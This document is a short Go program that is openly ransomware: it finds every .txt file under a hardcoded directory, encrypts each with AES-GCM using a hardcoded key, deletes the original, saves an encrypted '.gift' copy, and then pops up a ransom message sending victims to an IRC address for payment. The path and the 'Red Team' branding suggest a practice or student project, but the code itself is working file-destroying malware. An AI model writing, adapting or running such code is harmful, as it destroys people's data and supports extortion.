package main

import (
	"crypto/aes"
	"crypto/cipher"
	"fmt"
	"os"
	"path/filepath"

	"tawesoft.co.uk/go/dialog"
)

func main() {
	aesKey := "adfs4856#!@$#@595689yhygf8gf23$2"
	victimDirectory := "/home/anthony/Documents/code/go/ransomLockdown/src/"
	var files []string
	err := filepath.Walk(victimDirectory,
		func(path string, info os.FileInfo, err error) error {
			if err != nil {
				return err
			}
			if !info.IsDir() && filepath.Ext(path) == ".txt" {
				files = append(files, path)
			}

			return nil
		})
	if err != nil {
		fmt.Println(err)
	}
	key := []byte(aesKey)

	c, err := aes.NewCipher(key)
	if err != nil {
		fmt.Fprintf(os.Stderr, "Fatal error: %s", err.Error())
		os.Exit(1)
	}

	gcm, err := cipher.NewGCM(c)
	nonce := make([]byte, gcm.NonceSize())

	for _, file := range files {
		rawString, err := os.ReadFile(file)
		text := []byte(rawString)
		text = gcm.Seal(nonce, nonce, text, nil)
		os.Remove(file)
		f, err := os.Create((file + ".gift"))
		f.Write(text)
		f.Close()
		if err != nil {
			println("f", err)
		}
	}
	dialog.Alert("Thank you for choosing The Red Team as your source of ransomware!\n\nPlease contact us using the XChat IRC Client at 34.201.53.106:6667 for payment option.")
}
